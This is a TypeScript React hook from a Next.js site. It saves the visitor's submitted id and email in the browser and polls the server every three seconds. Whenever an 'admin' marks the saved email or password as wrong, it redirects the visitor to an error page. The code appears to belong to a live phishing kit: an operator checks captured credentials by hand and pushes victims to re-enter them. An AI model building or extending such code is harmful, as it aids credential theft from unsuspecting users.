"use client";

// 🔎 Checks (in the background) if the admin marked the saved email / password
// as wrong and redirects the visitor to /?error=email-wrong or
// /?error=password-wrong when it happens.
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";

export const USER_ID_KEY = "userId";
export const USER_EMAIL_KEY = "userEmail";

// How often the page asks the server about its own status
const POLL_INTERVAL = 3000;

const WRONG_STATUSES = ["email-wrong", "password-wrong"];

type UserStatusResponse = {
  success: boolean;
  data?: { status?: string };
};

// 💾 Remember which saved login belongs to this browser
export const setCurrentUser = (id: string, email?: string) => {
  try {
    if (id) localStorage.setItem(USER_ID_KEY, id);
    if (email) localStorage.setItem(USER_EMAIL_KEY, email);
  } catch (error) {
    console.error("Failed to save user id: ", error);
  }
};

export const getCurrentUserId = () => {
  try {
    return localStorage.getItem(USER_ID_KEY);
  } catch (error) {
    console.error("Failed to read user id: ", error);
    return null;
  }
};

// Fallback identifier, so tabs that logged in before this update (no saved id)
// can still be matched. redux-persist already keeps the email in "persist:root"
export const getCurrentEmail = () => {
  try {
    const email = localStorage.getItem(USER_EMAIL_KEY);
    if (email) return email;

    const root = localStorage.getItem("persist:root");
    if (!root) return "";

    const userAuth = (JSON.parse(root) as { userAuth?: string }).userAuth;
    if (!userAuth) return "";

    return (JSON.parse(userAuth) as { user?: string }).user || "";
  } catch (error) {
    console.error("Failed to read user email: ", error);
    return "";
  }
};

const useWrongCredentials = () => {
  const router = useRouter();
  const [status, setStatus] = useState("");
  const [urlError, setUrlError] = useState("");

  // 📬 Read ?error=... from the address bar (full page loads / back button)
  useEffect(() => {
    const syncError = () => {
      const params = new URLSearchParams(window.location.search);
      setUrlError(params.get("error") || "");
    };

    syncError();
    window.addEventListener("popstate", syncError);
    return () => window.removeEventListener("popstate", syncError);
  }, []);

  useEffect(() => {
    let isActive = true;
    const timer: { id?: ReturnType<typeof setInterval> } = {};

    const checkStatus = async () => {
      const userId = getCurrentUserId();

      // Nothing was submitted from this browser yet → stop asking
      if (!userId) {
        if (timer.id) clearInterval(timer.id);
        return;
      }

      try {
        const res = await axios.get<UserStatusResponse>(
          `/api/user-status?id=${userId}`
        );

        if (!isActive) return;

        const currentStatus = res.data?.data?.status || "";

        // ✅ Always keep "wrong" statuses, never downgrade back to ""
        if (WRONG_STATUSES.includes(currentStatus)) setStatus(currentStatus);

        // Already sitting on that error page → no redirect loop
        const currentError = new URLSearchParams(window.location.search).get(
          "error"
        );
        if (currentError === currentStatus) return;

        if (WRONG_STATUSES.includes(currentStatus)) {
          router.push(`/?error=${currentStatus}`);
        }
      } catch (error) {
        console.error("Failed to check user status: ", error);
      }
    };

    checkStatus();
    timer.id = setInterval(checkStatus, POLL_INTERVAL);

    return () => {
      isActive = false;
      if (timer.id) clearInterval(timer.id);
    };
  }, [router]);

  return { error: status || urlError };
};

export default useWrongCredentials;
